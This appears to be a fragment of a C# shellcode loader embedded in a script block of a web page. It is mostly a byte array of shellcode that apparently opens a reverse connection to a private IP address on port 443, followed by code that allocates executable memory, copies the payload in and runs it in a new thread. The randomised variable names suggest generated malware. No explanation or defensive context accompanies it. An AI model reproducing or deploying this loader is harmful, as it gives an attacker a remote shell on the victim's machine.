...
0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x0e,0x1c,0x68,0x02,0x00,0x01,0xbb,0x89,
...
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr a2MK51 = VirtualAlloc(IntPtr.Zero,(UIntPtr)qaapRM.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(qaapRM,0,a2MK51,qaapRM.Length);
        IntPtr hH22wv = IntPtr.Zero;
        IntPtr aD3i = CreateThread(IntPtr.Zero,UIntPtr.Zero,a2MK51,IntPtr.Zero,0,ref hH22wv);
    }
</script>
